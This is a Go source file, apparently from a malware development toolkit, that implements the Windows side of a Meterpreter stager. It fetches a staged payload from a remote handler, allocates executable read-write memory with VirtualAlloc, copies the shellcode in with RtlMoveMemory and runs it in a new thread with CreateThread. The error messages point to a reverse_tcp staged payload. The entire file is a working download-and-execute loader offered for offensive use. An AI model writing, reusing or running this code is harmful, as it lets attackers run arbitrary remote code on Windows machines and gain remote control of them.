//go:build windows

package meterpreter

import (
	"fmt"
	"runtime"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	"golang.org/x/sys/windows"
)

// platformSpecificStage handles Windows staging.
func (s *Stager) platformSpecificStage() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("this code should only run on Windows")
	}
	return s.stageWindows()
}

// stageWindows fetches and executes the stage on Windows.
func (s *Stager) stageWindows() error {
	shellcode, err := s.fetchStage()
	if err != nil {
		return fmt.Errorf("failed to fetch stage: %w", err)
	}

	if len(shellcode) > 500*1024 {
		return fmt.Errorf("received payload too large (%d bytes), probably stageless instead of staged. "+
			"Use handler with staged payload (e.g., windows/x64/meterpreter/reverse_tcp, NOT meterpreter_reverse_tcp)", len(shellcode))
	}

	if len(shellcode) < 50 {
		return fmt.Errorf("received payload too small (%d bytes), invalid stage", len(shellcode))
	}

	return executeInMemory(shellcode)
}

// executeInMemory allocates RWX memory, copies shellcode, and executes it
// using VirtualAlloc + RtlMoveMemory + CreateThread via win/api.
func executeInMemory(shellcode []byte) error {
	addr, _, err := api.ProcVirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAlloc failed: %w", err)
	}

	_, _, _ = api.ProcRtlMoveMemory.Call(
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	thread, _, err := api.ProcCreateThread.Call(
		0,
		0,
		addr,
		0,
		0,
		0,
	)
	if thread == 0 {
		return fmt.Errorf("CreateThread failed: %w", err)
	}

	return nil
}
